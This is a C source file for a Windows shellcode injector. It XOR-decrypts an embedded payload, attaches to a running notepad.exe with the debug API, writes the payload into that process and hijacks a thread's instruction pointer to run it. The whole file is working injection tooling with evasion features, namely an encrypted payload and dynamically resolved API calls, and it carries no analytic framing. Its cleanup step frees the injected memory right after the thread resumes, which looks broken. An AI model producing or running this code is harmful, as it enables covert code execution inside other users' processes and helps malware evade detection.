#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string.h>

// XOR encryption key
#define XOR_KEY 0x5A

const unsigned char EncryptedShellcode[] = {
    0xA6, 0x12, 0xD9, 0xBE, 0xAA, 0xB2, 0x9A, 0x5A, 0x5A, 0x5A, 0x1B, 0x0B,
    0x1B, 0x0A, 0x08, 0x0B, 0x0C, 0x12, 0x6B, 0x88, 0x3F, 0x12, 0xD1, 0x08,
    0x3A, 0x12, 0xD1, 0x08, 0x42, 0x12, 0xD1, 0x08, 0x7A, 0x12, 0xD1, 0x28,
    0x0A, 0x12, 0x55, 0xED, 0x10, 0x10, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A,
    0xF6, 0x66, 0x3B, 0x26, 0x58, 0x76, 0x7A, 0x1B, 0x9B, 0x93, 0x57, 0x1B,
    0x5B, 0x9B, 0xB8, 0xB7, 0x08, 0x1B, 0x0B, 0x12, 0xD1, 0x08, 0x7A, 0xD1,
    0x18, 0x66, 0x12, 0x5B, 0x8A, 0xD1, 0xDA, 0xD2, 0x5A, 0x5A, 0x5A, 0x12,
    0xDF, 0x9A, 0x2E, 0x3D, 0x12, 0x5B, 0x8A, 0x0A, 0xD1, 0x12, 0x42, 0x1E,
    0xD1, 0x1A, 0x7A, 0x13, 0x5B, 0x8A, 0xB9, 0x0C, 0x12, 0xA5, 0x93, 0x1B,
    0xD1, 0x6E, 0xD2, 0x12, 0x5B, 0x8C, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A,
    0xF6, 0x1B, 0x9B, 0x93, 0x57, 0x1B, 0x5B, 0x9B, 0x62, 0xBA, 0x2F, 0xAB,
    0x16, 0x59, 0x16, 0x7E, 0x52, 0x1F, 0x63, 0x8B, 0x2F, 0x82, 0x02, 0x1E,
    0xD1, 0x1A, 0x7E, 0x13, 0x5B, 0x8A, 0x3C, 0x1B, 0xD1, 0x56, 0x12, 0x1E,
    0xD1, 0x1A, 0x46, 0x13, 0x5B, 0x8A, 0x1B, 0xD1, 0x5E, 0xD2, 0x12, 0x5B,
    0x8A, 0x1B, 0x02, 0x1B, 0x02, 0x04, 0x03, 0x00, 0x1B, 0x02, 0x1B, 0x03,
    0x1B, 0x00, 0x12, 0xD9, 0xB6, 0x7A, 0x1B, 0x08, 0xA5, 0xBA, 0x02, 0x1B,
    0x03, 0x00, 0x12, 0xD1, 0x48, 0xB3, 0x0D, 0xA5, 0xA5, 0xA5, 0x07, 0x12,
    0xE0, 0x5B, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x12, 0xD7, 0xD7,
    0x5B, 0x5B, 0x5A, 0x5A, 0x1B, 0xE0, 0x6B, 0xD1, 0x35, 0xDD, 0xA5, 0x8F,
    0xE1, 0xBA, 0x47, 0x70, 0x50, 0x1B, 0xE0, 0xFC, 0xCF, 0xE7, 0xC7, 0xA5,
    0x8F, 0x12, 0xD9, 0x9E, 0x72, 0x66, 0x5C, 0x26, 0x50, 0xDA, 0xA1, 0xBA,
    0x2F, 0x5F, 0xE1, 0x1D, 0x49, 0x28, 0x35, 0x30, 0x5A, 0x03, 0x1B, 0xD3,
    0x80, 0xA5, 0x8F, 0x39, 0x3B, 0x36, 0x39, 0x5A
};

// Function to decrypt shellcode
void DecryptShellcode(unsigned char* shellcode, SIZE_T size, unsigned char key) {
    for (SIZE_T i = 0; i < size; i++) {
        shellcode[i] ^= key;
    }
}

// Dynamic API resolution
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);

DWORD HashString(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = ((hash << 5) + hash) + *str;
        str++;
    }
    return hash;
}

FARPROC GetFunctionAddress(HMODULE hModule, const char* funcName) {
    pGetProcAddress getProcAddress = (pGetProcAddress)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    return getProcAddress(hModule, funcName);
}

// Find process ID by name
DWORD FindProcessId(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed: %d\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// Find the "last" thread (highest thread ID)
DWORD FindLastThreadId(DWORD pid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed: %d\n", GetLastError());
        return 0;
    }

    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
    DWORD lastThreadId = 0;
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid && te.th32ThreadID > lastThreadId) {
                lastThreadId = te.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    return lastThreadId;
}

int InjectShellcodeWithDebugAPI(DWORD pid, unsigned char* shellcode, SIZE_T shellcodeSize) {
    // Resolve APIs dynamically
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    typedef BOOL(WINAPI* pDebugActiveProcess)(DWORD);
    typedef BOOL(WINAPI* pDebugActiveProcessStop)(DWORD);
    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef BOOL(WINAPI* pGetThreadContext)(HANDLE, LPCONTEXT);
    typedef BOOL(WINAPI* pSetThreadContext)(HANDLE, const CONTEXT*);
    typedef DWORD(WINAPI* pSuspendThread)(HANDLE);
    typedef DWORD(WINAPI* pResumeThread)(HANDLE);
    typedef BOOL(WINAPI* pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);

    pDebugActiveProcess debugActiveProcess = (pDebugActiveProcess)GetFunctionAddress(hKernel32, "DebugActiveProcess");
    pDebugActiveProcessStop debugActiveProcessStop = (pDebugActiveProcessStop)GetFunctionAddress(hKernel32, "DebugActiveProcessStop");
    pVirtualAllocEx virtualAllocEx = (pVirtualAllocEx)GetFunctionAddress(hKernel32, "VirtualAllocEx");
    pWriteProcessMemory writeProcessMemory = (pWriteProcessMemory)GetFunctionAddress(hKernel32, "WriteProcessMemory");
    pGetThreadContext getThreadContext = (pGetThreadContext)GetFunctionAddress(hKernel32, "GetThreadContext");
    pSetThreadContext setThreadContext = (pSetThreadContext)GetFunctionAddress(hKernel32, "SetThreadContext");
    pSuspendThread suspendThread = (pSuspendThread)GetFunctionAddress(hKernel32, "SuspendThread");
    pResumeThread resumeThread = (pResumeThread)GetFunctionAddress(hKernel32, "ResumeThread");
    pVirtualFreeEx virtualFreeEx = (pVirtualFreeEx)GetFunctionAddress(hKernel32, "VirtualFreeEx");

    // Attach as debugger
    if (!debugActiveProcess(pid)) {
        printf("[!] DebugActiveProcess Failed: %d\n", GetLastError());
        return -1;
    }

    // Open process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[!] OpenProcess Failed: %d\n", GetLastError());
        debugActiveProcessStop(pid);
        return -1;
    }

    // Allocate memory
    LPVOID remoteAddr = virtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) {
        printf("[!] VirtualAllocEx Failed: %d\n", GetLastError());
        debugActiveProcessStop(pid);
        CloseHandle(hProcess);
        return -1;
    }

    // Write shellcode
    SIZE_T bytesWritten;
    if (!writeProcessMemory(hProcess, remoteAddr, shellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
        printf("[!] WriteProcessMemory Failed: %d\n", GetLastError());
        virtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        debugActiveProcessStop(pid);
        CloseHandle(hProcess);
        return -1;
    }

    // Find last thread
    DWORD threadId = FindLastThreadId(pid);
    if (threadId == 0) {
        printf("[!] No threads found in process\n");
        virtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        debugActiveProcessStop(pid);
        CloseHandle(hProcess);
        return -1;
    }

    // Open thread
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    if (!hThread) {
        printf("[!] OpenThread Failed: %d\n", GetLastError());
        virtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        debugActiveProcessStop(pid);
        CloseHandle(hProcess);
        return -1;
    }

    // Suspend thread
    if (suspendThread(hThread) == (DWORD)-1) {
        printf("[!] SuspendThread Failed: %d\n", GetLastError());
        virtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        debugActiveProcessStop(pid);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    // Modify thread context
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    if (!getThreadContext(hThread, &ctx)) {
        printf("[!] GetThreadContext Failed: %d\n", GetLastError());
        resumeThread(hThread);
        virtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        debugActiveProcessStop(pid);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    ctx.Rip = (DWORD64)remoteAddr;
    if (!setThreadContext(hThread, &ctx)) {
        printf("[!] SetThreadContext Failed: %d\n", GetLastError());
        resumeThread(hThread);
        virtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        debugActiveProcessStop(pid);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    // Resume thread
    if (resumeThread(hThread) == (DWORD)-1) {
        printf("[!] ResumeThread Failed: %d\n", GetLastError());
        virtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        debugActiveProcessStop(pid);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    // Cleanup
    virtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
    debugActiveProcessStop(pid);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("[i] Shellcode injected into thread %u of process %u\n", threadId, pid);
    return 0;
}

int main() {
    // Decrypt shellcode
    SIZE_T shellcodeSize = sizeof(EncryptedShellcode);
    unsigned char* shellcode = (unsigned char*)malloc(shellcodeSize);
    if (!shellcode) {
        printf("[!] Memory allocation failed\n");
        return -1;
    }
    memcpy(shellcode, EncryptedShellcode, shellcodeSize);
    DecryptShellcode(shellcode, shellcodeSize, XOR_KEY);

    // Find running notepad.exe
    DWORD pid = FindProcessId("notepad.exe");
    if (pid == 0) {
        printf("[!] notepad.exe not found. Please start notepad.exe.\n");
        free(shellcode);
        return -1;
    }

    // Inject shellcode using process hypnosis
    int result = InjectShellcodeWithDebugAPI(pid, shellcode, shellcodeSize);

    // Cleanup
    free(shellcode);
    return result;
}
